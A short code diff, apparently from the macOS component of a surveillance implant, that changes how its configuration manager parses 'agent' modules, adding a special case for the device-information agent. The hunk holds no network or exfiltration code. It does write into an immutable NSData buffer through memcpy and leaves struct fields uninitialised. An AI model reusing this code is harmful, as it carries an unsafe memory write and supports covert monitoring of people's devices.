@@ -180,7 +180,7 @@ static int actionCounter = 0;
 - (BOOL)_parseAgents: (NSData *)aData nTimes: (int)nTimes
 {
   agentStruct *header;
-  NSData *rawHeader;
+  NSData *rawHeader, *tempData;
   int i;
   u_long pos = 0;
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
@@ -191,14 +191,37 @@ static int actionCounter = 0;
                                  length: sizeof(agentStruct)];
       
       header = (agentStruct *)[rawHeader bytes];
+      
 #ifdef DEBUG_CONF_MANAGER
       verboseLog(@"agent ID: %x", header->agentID);
       verboseLog(@"agent status: %d", header->status);
 #endif
+      
       if (header->internalDataSize)
         {
-          NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
-                                            length: header->internalDataSize];
+          // Workaround for re-run agent DEVICE every sync
+          if (header->agentID == LOGTYPE_DEVICE)
+          {
+            deviceStruct tmpDevice;
+            
+            if (header->status == 1)
+              tmpDevice.isEnabled = AGENT_DEV_ENABLED;
+            else
+              tmpDevice.isEnabled = AGENT_DEV_NOTENABLED;
+            
+            tempData = [NSData dataWithBytes: &tmpDevice length: sizeof(deviceStruct)];
+            
+            memcpy((void*)[tempData bytes], (void*)[aData bytes] + pos + 0xC, sizeof(UInt32)); 
+            
+#ifdef DEBUG_CONF_MANAGER
+            NSLog(@"%s: AGENT DEVICE additional header %@", __FUNCTION__, tempData);
+#endif
+          }
+          else
+          {
+            tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
+                                      length: header->internalDataSize];
+          }
           //infoLog(@"%@", tempData);
           // Jump to the next event (dataSize + PAD)
           pos += header->internalDataSize + 0xC;
